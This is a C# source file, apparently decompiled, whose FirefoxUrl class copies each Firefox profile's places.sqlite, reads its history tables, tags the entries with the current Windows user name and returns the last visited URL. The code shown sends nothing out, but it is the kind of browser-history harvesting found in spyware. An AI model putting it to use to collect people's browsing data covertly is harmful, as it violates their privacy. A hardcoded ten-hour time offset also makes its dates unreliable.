#define TRACE
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

namespace jimbii;

internal class FirefoxUrl
{
	public static string getLastVisited()
	{
		string result = "";
		DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0);
		Dictionary<string, HistoryEntry> uRLCache = GetURLCache();
		foreach (KeyValuePair<string, HistoryEntry> item in uRLCache)
		{
			if (item.Value.LastAccessDate > dateTime)
			{
				result = item.Value.Url;
				dateTime = item.Value.LastAccessDate;
			}
		}
		return result;
	}

	public static Dictionary<string, HistoryEntry> GetURLCache()
	{
		try
		{
			Dictionary<string, HistoryEntry> list = new Dictionary<string, HistoryEntry>();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			folderPath += "\\Mozilla\\Firefox\\Profiles\\";
			if (Directory.Exists(folderPath))
			{
				string[] directories = Directory.GetDirectories(folderPath);
				foreach (string folder in directories)
				{
					ExtractUserHistory(ref list, folder);
				}
			}
			return list;
		}
		catch (Exception ex)
		{
			Trace.WriteLine("ERROR: FFHistory.GetURLCache() (" + ex.Message + ")");
			Trace.Flush();
			return null;
		}
	}

	private static void ExtractUserHistory(ref Dictionary<string, HistoryEntry> list, string folder)
	{
		try
		{
			DataTable dataTable = ExtractFromTable("moz_places", folder);
			DataTable dataTable2 = ExtractFromTable("moz_historyvisits", folder);
			string name = WindowsIdentity.GetCurrent().Name;
			name = name.Substring(name.IndexOf("\\") + 1);
			foreach (DataRow row in dataTable.Rows)
			{
				DataRow dataRow2 = null;
				foreach (DataRow row2 in dataTable2.Rows)
				{
					if (row2["place_id"].ToString() == row["id"].ToString())
					{
						dataRow2 = row2;
					}
				}
				if (dataRow2 != null)
				{
					string text = row["Url"].ToString();
					HistoryEntry historyEntry = new HistoryEntry();
					historyEntry.Url = text;
					historyEntry.User = name;
					historyEntry.LastAccessDate = ConvertFFStrToDate(dataRow2["visit_date"].ToString());
					list.Add(text, historyEntry);
				}
			}
		}
		catch (Exception ex)
		{
			Trace.WriteLine("ERROR: FFHistory.ExtractUserHistory() (" + ex.Message + ")");
			Trace.Flush();
		}
	}

	private static DateTime ConvertFFStrToDate(string ffDate)
	{
		DateTime result = new DateTime(1970, 1, 1, 0, 0, 0);
		try
		{
			long num = Convert.ToInt64(ffDate) / 1000000L;
			result = result.AddSeconds(num).AddHours(10.0);
			return result;
		}
		catch (Exception ex)
		{
			Trace.WriteLine("ERROR: FFHistory.ConvertFFStrToDate() (" + ex.Message + ")");
			Trace.Flush();
			return result;
		}
	}

	private static DataTable ExtractFromTable(string table, string folder)
	{
		try
		{
			DataTable dataTable = new DataTable();
			string sourceFileName = folder + "\\places.sqlite";
			string tempFileName = Path.GetTempFileName();
			File.Copy(sourceFileName, tempFileName, overwrite: true);
			if (File.Exists(tempFileName))
			{
				SQLiteConnection sQLiteConnection = new SQLiteConnection("Data Source=" + tempFileName + ";Version=3;New=False;Compress=True;");
				sQLiteConnection.Open();
				sQLiteConnection.CreateCommand();
				string commandText = "select * from " + table;
				SQLiteDataAdapter sQLiteDataAdapter = new SQLiteDataAdapter(commandText, sQLiteConnection);
				sQLiteDataAdapter.Fill(dataTable);
				sQLiteConnection.Close();
			}
			File.Delete(tempFileName);
			return dataTable;
		}
		catch (Exception ex)
		{
			Trace.WriteLine("ERROR: FFHistory.ExtractFromTable() (" + ex.Message + ")");
			Trace.Flush();
			return new DataTable();
		}
	}
}
